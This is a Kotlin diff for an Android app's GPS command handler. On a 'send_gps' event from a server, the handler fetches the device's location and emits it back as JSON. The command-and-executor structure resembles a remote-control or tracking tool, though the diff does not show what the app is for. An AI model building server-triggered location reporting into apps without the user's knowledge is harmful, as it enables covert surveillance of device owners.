@@ -1,7 +1,6 @@
 package com.hc.calling.commands.gps
 
 import android.annotation.SuppressLint
-import android.app.Activity
 import android.content.Context
 import android.location.Location
 import android.os.Bundle
@@ -11,7 +10,12 @@ import com.google.android.gms.location.*
 import com.google.gson.Gson
 import com.hc.calling.commands.Command
 import com.hc.calling.commands.Executor
+import com.hc.calling.commands.gps.util.GpsDTO
 import com.orhanobut.logger.Logger
+import kotlinx.coroutines.Dispatchers
+import kotlinx.coroutines.GlobalScope
+import kotlinx.coroutines.launch
+import kotlinx.coroutines.runBlocking
 
 
 /**
@@ -29,11 +33,10 @@ class GPS(context: Context) : Command(), Executor {
     companion object {
         const val SEND_GPS = "send_gps"  //event from server
         const val GPS = "gps" //event to server
-        const val LONGITUDE = "longitude"
-        const val LATITUDE = "latitude"
+
         var gpsDTO = GpsDTO("", "")
         @SuppressLint("MissingPermission")
-        fun getGPS(context: Activity, doWithLocation: (location: Location) -> Unit?) {
+        fun getGPS(context: Context, doWithLocation: (location: Location) -> Unit?) {
             LocationServices.getFusedLocationProviderClient(context)
                 .requestLocationUpdates(initLocationRequest(), object : LocationCallback() {
                     override fun onLocationResult(locationResult: LocationResult?) {
@@ -94,10 +97,16 @@ class GPS(context: Context) : Command(), Executor {
         }
     }
 
-    override fun execute(data: Any) {
-        val gps = Gson().toJson(gpsDTO)
-        emitData(GPS, gps)
-    }
+    override fun execute(data: Array<Any>) {
 
+        GlobalScope.launch(Dispatchers.Main) {
+            runBlocking {
+                getGPS(context!!) {
+                    emitData(GPS, Gson().toJson(gpsDTO))
+                    return@getGPS Unit
+                }
+            }
+        }
+    }
 
 }
